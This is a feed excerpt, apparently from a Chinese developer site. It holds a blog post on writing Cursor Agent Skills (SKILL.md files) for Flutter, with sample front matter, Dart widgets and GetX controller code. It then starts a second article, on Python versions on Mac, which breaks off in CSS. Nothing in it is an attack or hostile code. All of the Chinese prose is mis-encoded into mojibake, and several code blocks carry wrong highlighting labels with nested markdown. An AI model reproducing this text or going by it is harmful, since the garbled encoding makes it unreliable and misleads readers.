<p>æœ€è¿‘ç½‘ä¸Šä¸€ç›´åœ¨ç‚’ Agent Skills åŠŸèƒ½, å¹´åº•ä¸å¿™äº†æ‘¸ç´¢äº†ä¸€ä¸‹ Cursor çš„Agent Skills è¿™ä¸ªåŠŸèƒ½ã€‚ç»“æœç”¨äº†å‡ å¤©ä¹‹å... å“‡å¶çœŸé¦™ã€‚</p>
<p>ä»Šå¤©å°±æ¥èŠèŠè¿™ç©æ„å„¿æ€ä¹ˆç”¨ï¼Œé¡ºä¾¿åˆ†äº«ä¸‹æˆ‘è¸©çš„å‘ã€‚</p>
<hr/>
<h3 data-id="heading-1">è¿™ä¸œè¥¿åˆ°åº•æ˜¯å¹²å˜›çš„ï¼Ÿ</h3>
<p>å…¶å®è¯´ç™½äº†ï¼Œå°±æ˜¯è®©ä½ "è°ƒæ•™" AI çš„ä¸€ç§æ–¹å¼ã€‚</p>
<p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§æƒ…å†µï¼šè®© AI å¸®ä½ å†™ä¸ª Flutter Widgetï¼Œå®ƒå†™å‡ºæ¥çš„ä»£ç é£æ ¼è·Ÿä½ é¡¹ç›®é‡Œçš„å®Œå…¨ä¸ä¸€æ ·ï¼Ÿä½ è¯´"åŠ ä¸ª const"ï¼Œå®ƒä¸‹æ¬¡åˆå¿˜äº†ã€‚ä½ è¯´"ç”¨ GetX"ï¼Œå®ƒç»™ä½ æ•´ä¸ª Provider...</p>
<p>Skills å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„ã€‚ä½ å†™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå‘Šè¯‰ AI "æˆ‘ä»¬é¡¹ç›®æ˜¯è¿™ä¹ˆå¹²çš„"ï¼Œå®ƒå°±ä¼šç…§ç€æ¥ã€‚</p>
<hr/>
<h3 data-id="heading-2">æ–‡ä»¶æ”¾å“ªå„¿ï¼Ÿ</h3>
<p>ä¸¤ä¸ªåœ°æ–¹å¯ä»¥æ”¾ï¼š</p>
<p><strong>ä¸ªäººç›®å½•</strong>ï¼š<code>~/.cursor/skills/ä½ çš„æŠ€èƒ½å/SKILL.md</code></p>
<ul>
<li>æ‰€æœ‰é¡¹ç›®éƒ½èƒ½ç”¨</li>
<li>æ¯”å¦‚ä½ çš„ä»£ç é£æ ¼åå¥½ã€å¸¸ç”¨çš„å·¥å…·é“¾é…ç½®</li>
</ul>
<p><strong>é¡¹ç›®ç›®å½•</strong>ï¼š<code>é¡¹ç›®æ ¹ç›®å½•/.cursor/skills/ä½ çš„æŠ€èƒ½å/SKILL.md</code></p>
<ul>
<li>åªæœ‰å½“å‰é¡¹ç›®ç”¨</li>
<li>å¯ä»¥æäº¤ Gitï¼Œå›¢é˜Ÿå…±äº«</li>
</ul>
<p>å› ä¸ºå…¬å¸åªæœ‰æˆ‘ä¸€ä¸ªç§»åŠ¨ç«¯å¼€å‘, æ‰€ä»¥æˆ‘ä¸€èˆ¬æ˜¯é€šç”¨çš„æ”¾ä¸ªäººç›®å½•ï¼Œé¡¹ç›®ç‰¹å®šçš„æ”¾é¡¹ç›®é‡Œã€‚</p>
<hr/>
<h3 data-id="heading-3">å…¥é—¨ï¼šå†™ä¸ªæœ€ç®€å•çš„</h3>
<p>ç„¶åæ¥ä¸ªæœ€ç®€å•çš„æ„Ÿå—ä¸€ä¸‹ã€‚</p>
<p>åœ¨ <code>~/.cursor/skills/flutter-widget/</code> ä¸‹é¢å»ºä¸ª <code>SKILL.md</code>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">flutter-widget</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">å†™</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">Widget</span> <span class="hljs-string">çš„æ—¶å€™ç”¨è¿™ä¸ªã€‚åˆ›å»ºç»„ä»¶ã€å†™é¡µé¢ã€æ</span> <span class="hljs-string">UI</span> <span class="hljs-string">çš„æ—¶å€™ä¼šè‡ªåŠ¨è§¦å‘ã€‚</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment"># æˆ‘çš„ Widget å†™æ³•</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">åˆ«åºŸè¯ï¼Œç›´æ¥ä¸Šè§„çŸ©ï¼š</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">èƒ½ç”¨</span> <span class="hljs-string">StatelessWidget</span> <span class="hljs-string">å°±åˆ«ç”¨</span> <span class="hljs-string">StatefulWidget</span>
<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">æ„é€ å‡½æ•°å¿…é¡»åŠ </span> <span class="hljs-string">const</span>
<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">å‚æ•°å¿…å¡«çš„ç”¨</span> <span class="hljs-string">required</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">å°±è¿™æ ·å†™ï¼š</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">```dart</span>
<span class="hljs-string">class</span> <span class="hljs-string">UserCard</span> <span class="hljs-string">extends</span> <span class="hljs-string">StatelessWidget</span> {
  <span class="hljs-string">const</span> <span class="hljs-string">UserCard(</span>{
 Â  Â <span class="hljs-string">super.key</span>,
 Â  Â <span class="hljs-string">required</span> <span class="hljs-string">this.name</span>,
  }<span class="hljs-string">);</span>
<span class="hljs-string">â€‹</span>
  <span class="hljs-string">final</span> <span class="hljs-string">String</span> <span class="hljs-string">name;</span>
<span class="hljs-string">â€‹</span>
  <span class="hljs-string">@override</span>
  <span class="hljs-string">Widget</span> <span class="hljs-string">build(BuildContext</span> <span class="hljs-string">context)</span> {
 Â  Â <span class="hljs-string">return</span> <span class="hljs-string">Text(name);</span>
  }
}
</code></pre>
<p>åˆ«ç»™æˆ‘æ•´ä»€ä¹ˆ <code>Key? key</code> è€å†™æ³•ï¼Œç›´æ¥ <code>super.key</code> å®Œäº‹ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">â€‹</span>
<span class="hljs-string">ä¿å­˜ã€‚è¿™å°±å®Œäº‹äº†???</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">ç°åœ¨ä½ è®©</span> <span class="hljs-string">AI</span> <span class="hljs-string">"å¸®æˆ‘å†™ä¸ªç”¨æˆ·å¡ç‰‡ç»„ä»¶"</span><span class="hljs-string">ï¼Œå®ƒå°±ä¼šæŒ‰è¿™ä¸ªé£æ ¼æ¥ã€‚</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment">## è¿›é˜¶ï¼šdescription å¾ˆé‡è¦ï¼</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">è¿™é‡Œæœ‰ä¸ªå‘æˆ‘è¸©è¿‡â€”â€”description</span> <span class="hljs-string">å†™å¾—å¤ªéšæ„ï¼ŒAI</span> <span class="hljs-string">æ ¹æœ¬ä¸è§¦å‘ä½ çš„æŠ€èƒ½ã€‚</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">**é”™è¯¯ç¤ºèŒƒ**ï¼š</span>
<span class="hljs-string">```yaml</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">å¼€å‘</span>
</code></pre>
<p>è¿™å¤ªæ¨¡ç³Šäº†ï¼ŒAI ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™è¯¥ç”¨ã€‚</p>
<p><strong>æ­£ç¡®ç¤ºèŒƒ</strong>ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">description:</span> å†™ Flutter Widget çš„æ—¶å€™ç”¨ã€‚å½“ç”¨æˆ·è¯´<span class="hljs-string">"åˆ›å»ºç»„ä»¶"</span>ã€<span class="hljs-string">"å†™é¡µé¢"</span>ã€<span class="hljs-string">"æä¸ª UI"</span>ã€<span class="hljs-string">"å¼„ä¸ªå¡ç‰‡"</span>çš„æ—¶å€™è§¦å‘ã€‚
</code></pre>
<p>å…³é”®æ˜¯è¦å†™æ¸…æ¥š<strong>ä»€ä¹ˆæ—¶å€™ç”¨</strong>ã€‚AI æ˜¯æ ¹æ®è¿™ä¸ª description æ¥åˆ¤æ–­è¦ä¸è¦åŠ è½½ä½ çš„æŠ€èƒ½çš„ã€‚</p>
<hr/>
<h3 data-id="heading-4">ä¸­çº§ç©æ³•ï¼šåŠ ç‚¹æ–™</h3>
<p>ç”¨äº†ä¸€é˜µä¹‹åï¼Œæˆ‘å‘ç°å…‰å†™ Widget è§„èŒƒä¸å¤Ÿã€‚å¯¼å…¥é¡ºåºã€æ–‡ä»¶å‘½åè¿™äº›ä¹Ÿå¾—ç®¡ï¼Œä¸ç„¶ä»£ç è¿˜æ˜¯ä¹±ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">flutter-dev</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">å¼€å‘å…¨å¥—è§„èŒƒã€‚å†™ä»£ç ã€å»ºæ–‡ä»¶ã€æé¡µé¢çš„æ—¶å€™ç”¨ã€‚</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment"># Flutter å¼€å‘è§„èŒƒï¼ˆæˆ‘çš„ç‰ˆæœ¬ï¼‰</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment">## æ–‡ä»¶æ€ä¹ˆå‘½å</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">æˆ‘ä¹ æƒ¯è¿™æ ·ï¼š</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">Widget</span> <span class="hljs-string">æ–‡ä»¶ï¼š`user_card.dart`ï¼ˆå°å†™ä¸‹åˆ’çº¿ï¼‰</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">é¡µé¢æ–‡ä»¶ï¼š`user_page.dart`</span> <span class="hljs-string">æˆ–</span> <span class="hljs-string">`user_view.dart`</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">æœåŠ¡ç±»ï¼š`user_service.dart`</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">ç±»åå½“ç„¶è¿˜æ˜¯å¤§é©¼å³°</span> <span class="hljs-string">`UserCard`ã€‚</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment">## import é¡ºåº</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">è¿™ä¸ªæˆ‘æœ‰å¼ºè¿«ç—‡ï¼Œå¿…é¡»è¿™ä¹ˆæ’ï¼š</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">```dart</span>
<span class="hljs-string">//</span> <span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">dart</span> <span class="hljs-string">è‡ªå¸¦çš„</span>
<span class="hljs-string">import</span> <span class="hljs-string">'dart:async'</span><span class="hljs-string">;</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">//</span> <span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">flutter</span> <span class="hljs-string">çš„</span>
<span class="hljs-string">import</span> <span class="hljs-string">'package:flutter/material.dart'</span><span class="hljs-string">;</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">//</span> <span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">ç¬¬ä¸‰æ–¹åŒ…</span>
<span class="hljs-string">import</span> <span class="hljs-string">'package:get/get.dart'</span><span class="hljs-string">;</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">//</span> <span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">è‡ªå·±é¡¹ç›®çš„</span>
<span class="hljs-string">import</span> <span class="hljs-string">'../services/api.dart'</span><span class="hljs-string">;</span>
</code></pre>
<p>ä¸­é—´ç©ºä¸€è¡Œåˆ†éš”ï¼Œçœ‹ç€èˆ’æœã€‚</p>
<h3 data-id="heading-5">GetX Controller æ€ä¹ˆå†™</h3>
<p>æˆ‘ä»¬é¡¹ç›®ç”¨ GetXï¼Œcontroller è¿™ä¹ˆå†™ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">class UserController extends GetxController {
 Â final <span class="hljs-attr">_loading</span> = <span class="hljs-literal">false</span>.obs<span class="hljs-comment">;</span>
 Â bool get <span class="hljs-attr">loading</span> =&gt; _loading.value<span class="hljs-comment">;</span>
â€‹
 Â final <span class="hljs-attr">_user</span> = Rxn&lt;User&gt;()<span class="hljs-comment">;</span>
 Â User? get <span class="hljs-attr">user</span> =&gt; _user.value<span class="hljs-comment">;</span>
â€‹
 Â Future&lt;void&gt; loadUser() async {
 Â  Â <span class="hljs-attr">_loading.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
 Â  Â try {
 Â  Â  Â <span class="hljs-attr">_user.value</span> = await api.getUser()<span class="hljs-comment">;</span>
 Â   } finally {
 Â  Â  Â <span class="hljs-attr">_loading.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
 Â   }
  }
}
</code></pre>
<p>æ³¨æ„å‡ ç‚¹ï¼š</p>
<ul>
<li>ç§æœ‰å˜é‡ç”¨ä¸‹åˆ’çº¿</li>
<li>å¯¹å¤–æš´éœ² getter</li>
<li>loading çŠ¶æ€åˆ«å¿˜äº† finally é‡Œå…³æ‰</li>
</ul>
<h3 data-id="heading-6">é¡µé¢ç»“æ„</h3>
<pre><code class="hljs language-scss" lang="scss">class UserPage extends StatelessWidget {
 Â const <span class="hljs-built_in">UserPage</span>({super.key});
â€‹
 Â <span class="hljs-keyword">@override</span>
 Â Widget build(BuildContext context) {
 Â  Â return GetBuilder&lt;UserController&gt;(
 Â  Â  Â init: UserController(),
 Â  Â  Â builder: (c) =&gt; <span class="hljs-built_in">Scaffold</span>(
 Â  Â  Â  Â appBar: <span class="hljs-built_in">AppBar</span>(title: const <span class="hljs-built_in">Text</span>(<span class="hljs-string">'ç”¨æˆ·'</span>)),
 Â  Â  Â  Â body: <span class="hljs-built_in">Obx</span>(() {
 Â  Â  Â  Â  Â if (c.loading) {
 Â  Â  Â  Â  Â  Â return const Center(child: CircularProgressIndicator());
 Â  Â  Â  Â   }
 Â  Â  Â  Â  Â return <span class="hljs-built_in">_buildContent</span>(c);
 Â  Â  Â   }),
 Â  Â   ),
 Â   );
  }
â€‹
 Â Widget <span class="hljs-built_in">_buildContent</span>(UserController c) {
 Â  Â <span class="hljs-comment">// å†…å®¹</span>
  }
}
</code></pre>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">â€‹</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment">## é«˜çº§ç©æ³•ï¼šæ–‡ä»¶æ‹†åˆ†</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">æŠ€èƒ½å†™å¤šäº†ä¹‹åï¼Œä¸€ä¸ªæ–‡ä»¶å¡ä¸ä¸‹äº†ã€‚è€Œä¸”æ¯æ¬¡</span> <span class="hljs-string">AI</span> <span class="hljs-string">éƒ½è¦è¯»æ•´ä¸ªæ–‡ä»¶ï¼ŒToken</span> <span class="hljs-string">å“—å“—çš„çƒ§ã€‚</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">è¿™æ—¶å€™å°±è¦æ‹†åˆ†ã€‚</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">**ç›®å½•ç»“æ„**ï¼š</span>
</code></pre>
<p>~/.cursor/skills/flutter-pro/<br/>
â”œâ”€â”€ SKILL.md # ä¸»æ–‡ä»¶ï¼Œæ”¾æœ€å¸¸ç”¨çš„<br/>
â”œâ”€â”€ getx.md # GetX è¯¦ç»†ç”¨æ³•<br/>
â”œâ”€â”€ api.md # ç½‘ç»œè¯·æ±‚è§„èŒƒ<br/>
â””â”€â”€ widgets.md # ç»„ä»¶è§„èŒƒ<br/></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">â€‹</span>
<span class="hljs-string">**SKILL.md</span> <span class="hljs-string">é‡Œè¿™ä¹ˆå†™**ï¼š</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">```markdown</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">flutter-pro</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">å¼€å‘å®Œæ•´è§„èŒƒã€‚å†™ä»£ç ã€æçŠ¶æ€ç®¡ç†ã€è°ƒæ¥å£çš„æ—¶å€™ç”¨ã€‚</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment"># Flutter å¼€å‘</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment">## å¿«é€Ÿå‚è€ƒ</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment">### çŠ¶æ€ç®¡ç†</span>
<span class="hljs-string">ç”¨</span> <span class="hljs-string">GetXã€‚è¯¦ç»†çš„çœ‹</span> [<span class="hljs-string">getx.md</span>]<span class="hljs-string">(getx.md)</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment">### ç½‘ç»œè¯·æ±‚ Â </span>
<span class="hljs-string">ç”¨</span> <span class="hljs-string">Dio</span> <span class="hljs-string">+</span> <span class="hljs-string">æ‹¦æˆªå™¨ã€‚è¯¦ç»†çš„çœ‹</span> [<span class="hljs-string">api.md</span>]<span class="hljs-string">(api.md)</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment">### ç»„ä»¶å¼€å‘</span>
<span class="hljs-string">const</span> <span class="hljs-string">æ„é€ ã€StatelessWidget</span> <span class="hljs-string">ä¼˜å…ˆã€‚è¯¦ç»†çš„çœ‹</span> [<span class="hljs-string">widgets.md</span>]<span class="hljs-string">(widgets.md)</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment">## æœ€å¸¸ç”¨çš„ä»£ç </span>
<span class="hljs-string">â€‹</span>
<span class="hljs-string">ï¼ˆè¿™é‡Œæ”¾å‡ ä¸ªæœ€å¸¸ç”¨çš„æ¨¡æ¿ï¼‰</span>
</code></pre>
<p>è¿™æ · AI å¹³æ—¶åªè¯»ä¸»æ–‡ä»¶ï¼Œéœ€è¦è¯¦ç»†ä¿¡æ¯çš„æ—¶å€™æ‰å»è¯»å­æ–‡ä»¶ã€‚çœ Tokenã€‚</p>
<hr/>
<h3 data-id="heading-7">çœ Token çš„ä¸€äº›å¿ƒå¾—</h3>
<p>ç”¨äº†ä¸€æ®µæ—¶é—´ï¼Œæ€»ç»“äº†å‡ ä¸ªçœé’±æŠ€å·§ï¼š</p>
<h4 data-id="heading-8">1. åˆ«å†™åºŸè¯</h4>
<p>AI æ¯”ä½ æƒ³è±¡çš„èªæ˜ã€‚ä»€ä¹ˆæ˜¯ StatelessWidgetã€ä»€ä¹ˆæ˜¯ constï¼Œå®ƒéƒ½çŸ¥é“ã€‚ä½ åªéœ€è¦å‘Šè¯‰å®ƒ"ç”¨ const"å°±è¡Œäº†ï¼Œä¸ç”¨è§£é‡Šä¸ºä»€ä¹ˆã€‚</p>
<p><strong>åˆ«è¿™æ ·</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">## å…³äº <span class="hljs-type">const</span> å…³é”®å­—

<span class="hljs-type">const</span> æ˜¯ Dart ä¸­çš„ç¼–è¯‘æ—¶å¸¸é‡å…³é”®å­—ã€‚ä½¿ç”¨ <span class="hljs-type">const</span> å¯ä»¥è®© Flutter åœ¨ç¼–è¯‘æ—¶å°±ç¡®å®š Widget çš„å€¼ï¼Œä»è€Œä¼˜åŒ–æ€§èƒ½ã€‚å½“ Widget çš„æ‰€æœ‰å±æ€§éƒ½æ˜¯ç¼–è¯‘æ—¶å¸¸é‡æ—¶ï¼Œåº”è¯¥ä½¿ç”¨ <span class="hljs-type">const</span>...
</code></pre>
<p><strong>è¿™æ ·å°±å¤Ÿäº†</strong>ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta">## è§„çŸ©</span>
- æ„é€ å‡½æ•°åŠ  <span class="hljs-keyword">const</span>
- èƒ½ <span class="hljs-keyword">const</span> çš„ Widget éƒ½ <span class="hljs-keyword">const</span>
</code></pre>
<h4 data-id="heading-9">2. ç”¨æ¨¡æ¿ä»£æ›¿è§£é‡Š</h4>
<p>ä¸å…¶å†™ä¸€å¤§æ®µ"è¡¨å•éªŒè¯åº”è¯¥æ€ä¹ˆåš"ï¼Œä¸å¦‚ç›´æ¥è´´ä¸ªæ¨¡æ¿ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">TextFormField</span>(
  <span class="hljs-attr">validator</span>: <span class="hljs-function">(<span class="hljs-params">v</span>) =&gt;</span> v!.<span class="hljs-property">isEmpty</span> ? <span class="hljs-string">'å¿…å¡«'</span> : <span class="hljs-literal">null</span>,
  <span class="hljs-attr">decoration</span>: <span class="hljs-keyword">const</span> <span class="hljs-title class_">InputDecoration</span>(<span class="hljs-attr">labelText</span>: <span class="hljs-string">'ç”¨æˆ·å'</span>),
)
</code></pre>
<p>ä»£ç å°±æ˜¯æœ€å¥½çš„æ–‡æ¡£ã€‚</p>
<h4 data-id="heading-10">3. æ¸è¿›å¼æŠ«éœ²</h4>
<p>ä¸»æ–‡ä»¶æ”¾æœ€å¸¸ç”¨çš„ 20%ï¼Œå‰©ä¸‹ 80% æ‹†åˆ°å­æ–‡ä»¶ã€‚AI éœ€è¦çš„æ—¶å€™è‡ªå·±ä¼šå»è¯»ã€‚</p>
<hr/>
<h3 data-id="heading-11">æˆ‘ç°åœ¨çš„é…ç½®</h3>
<p>åˆ†äº«ä¸€ä¸‹æˆ‘è‡ªå·±çš„é…ç½®ï¼Œç»™ä½ å‚è€ƒï¼š</p>
<p><strong>ä¸ªäººç›®å½•</strong>ï¼ˆ<code>~/.cursor/skills/</code>ï¼‰ï¼š</p>
<ul>
<li><code>dart-style/</code> - Dart ä»£ç é£æ ¼ï¼ˆå‘½åã€æ³¨é‡Šè¿™äº›ï¼‰</li>
<li><code>git-msg/</code> - Git commit ä¿¡æ¯æ ¼å¼</li>
</ul>
<p><strong>é¡¹ç›®ç›®å½•</strong>ï¼ˆ<code>.cursor/skills/</code>ï¼‰ï¼š</p>
<ul>
<li><code>project-api/</code> - é¡¹ç›®çš„ API æ¥å£è§„èŒƒ</li>
<li><code>project-db/</code> - æœ¬åœ°æ•°æ®åº“æ“ä½œè§„èŒƒ</li>
</ul>
<p>è¿™æ ·åˆ†çš„å¥½å¤„æ˜¯ï¼šæ¢ä¸ªé¡¹ç›®ï¼Œä¸ªäººåå¥½è¿˜åœ¨ï¼Œé¡¹ç›®ç›¸å…³çš„é…ç½®è·Ÿç€é¡¹ç›®èµ°ã€‚</p>
<hr/>
<h3 data-id="heading-12">ä¸€äº›å‘</h3>
<h4 data-id="heading-13">æŠ€èƒ½æ²¡ç”Ÿæ•ˆï¼Ÿ</h4>
<p>æ£€æŸ¥ä¸€ä¸‹ï¼š</p>
<ol start="0">
<li><code>description</code> å†™å¾—å¤Ÿä¸å¤Ÿå…·ä½“</li>
<li>æ–‡ä»¶åæ˜¯ä¸æ˜¯ <code>SKILL.md</code>ï¼ˆå¤§å°å†™æ•æ„Ÿï¼‰</li>
<li>yaml æ ¼å¼æœ‰æ²¡æœ‰å†™é”™ï¼ˆå†’å·åé¢è¦æœ‰ç©ºæ ¼ï¼‰</li>
</ol>
<h4 data-id="heading-14">Skills å’Œ Rules æœ‰å•¥åŒºåˆ«ï¼Ÿ</h4>
<p>Rules æ˜¯æ¯æ¬¡å¯¹è¯éƒ½ä¼šåŠ è½½çš„ï¼ŒSkills æ˜¯æŒ‰éœ€åŠ è½½çš„ã€‚</p>
<p>æ‰€ä»¥ï¼š</p>
<ul>
<li>ç®€å•çš„ã€æ¯æ¬¡éƒ½è¦ç”¨çš„åå¥½ â†’ æ”¾ Rules</li>
<li>å¤æ‚çš„ã€ç‰¹å®šåœºæ™¯æ‰ç”¨çš„ â†’ æ”¾ Skills</li>
</ul>
<hr/>
<h3 data-id="heading-15">æœ€å</h3>
<p>è¿™åŠŸèƒ½æˆ‘è§‰å¾—æŒºå€¼å¾—èŠ±æ—¶é—´é…ç½®çš„ã€‚ä¸€æ¬¡é…ç½®ï¼Œåé¢çœå¾ˆå¤šäº‹ã€‚</p>
<p>åˆšå¼€å§‹åˆ«è´ªå¤šï¼Œå…ˆæä¸€ä¸ªæœ€ç®€å•çš„ï¼Œæ¯”å¦‚ Widget è§„èŒƒã€‚ç”¨é¡ºäº†å†æ…¢æ…¢åŠ ã€‚</p>
<p>æœ‰é—®é¢˜æ¬¢è¿äº¤æµã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨Macä¸Šä¼˜é›…ç®¡ç†Pythonå¤šç‰ˆæœ¬ï¼šä»å®‰è£…åˆ°ç–‘éš¾æ’é”™å…¨æ”»ç•¥]]></title>    <link>https://juejin.cn/post/7603160727717904435</link>    <guid>https://juejin.cn/post/7603160727717904435</guid>    <pubDate>2026-02-05T09:27:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727717904435" data-draft-id="7602982045138534446" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨Macä¸Šä¼˜é›…ç®¡ç†Pythonå¤šç‰ˆæœ¬ï¼šä»å®‰è£…åˆ°ç–‘éš¾æ’é”™å…¨æ”»ç•¥"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-05T09:27:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="leafyyuki"/> <meta itemprop="url" content="https://juejin.cn/user/2172290706728829"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨Macä¸Šä¼˜é›…ç®¡ç†Pythonå¤šç‰ˆæœ¬ï¼šä»å®‰è£…åˆ°ç–‘éš¾æ’é”™å…¨æ”»ç•¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2172290706728829/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    leafyyuki
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:27:09.000Z" title="Thu Feb 05 2026 09:27:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body 